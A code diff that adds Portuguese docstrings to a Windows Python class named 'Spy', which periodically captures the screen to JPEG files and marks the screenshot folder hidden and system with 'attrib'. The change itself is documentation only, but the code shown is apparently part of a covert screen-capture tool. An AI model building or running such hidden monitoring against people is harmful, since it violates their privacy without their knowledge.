@@ -1,3 +1,5 @@
+"""Módulo que define a classe que captura as screenshots"""
+
 import time
 import win32api
 import win32con
@@ -10,6 +12,8 @@ from PIL import Image
 
 
 class Spy:
+    """Clase principal, inicializa os atributos de dimensões da tela, define um contador e o diretorio das screenshots."""
+
     def __init__(self, screenshot_dir="screenshots") -> None:
         self.width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
         self.height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
@@ -23,9 +27,11 @@ class Spy:
             subprocess.call(["attrib", "+h", "+s", self.screenshot_dir])
 
     def get_dimensions(self) -> tuple:
+        """"Função para pegar as dimensões da tela"""
         return (self.width, self.height, self.top, self.left)
 
     def capture_screenshot(self, name='screenshot') -> None:
+        """Função que efetivamente captura a tela"""
         jpeg_ = os.path.join(
             self.screenshot_dir, f"{name}_{self.counter}.jpeg")
         self.counter += 1
@@ -53,6 +59,7 @@ class Spy:
             img.save(jpeg_, "JPEG", quality=50)
 
     def main(self, duration=None, interval_seconds=None) -> str:
+        """Função main, definindo a execução"""
 
         if os.path.exists(self.screenshot_dir):
             shutil.rmtree(self.screenshot_dir)
